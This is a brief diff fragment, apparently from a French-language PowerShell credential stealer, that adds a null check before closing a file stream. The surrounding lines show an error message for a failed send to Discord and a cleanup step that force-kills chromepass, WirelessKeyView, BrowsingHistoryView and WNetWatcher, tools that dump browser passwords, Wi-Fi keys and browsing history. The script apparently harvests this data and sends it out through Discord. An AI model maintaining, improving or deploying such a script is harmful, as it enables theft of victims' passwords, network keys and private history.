@@ -102,8 +102,10 @@ try {
     Write-Host "[-] Erreur lors de l'envoi Discord : $_" -ForegroundColor Red
 }
 
-$fileStream.Close()
-$fileStream.Dispose()
+if ($fileStream) {
+    $fileStream.Close()
+    $fileStream.Dispose()
+}
 
 # Nettoyage final sécurisé
 Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
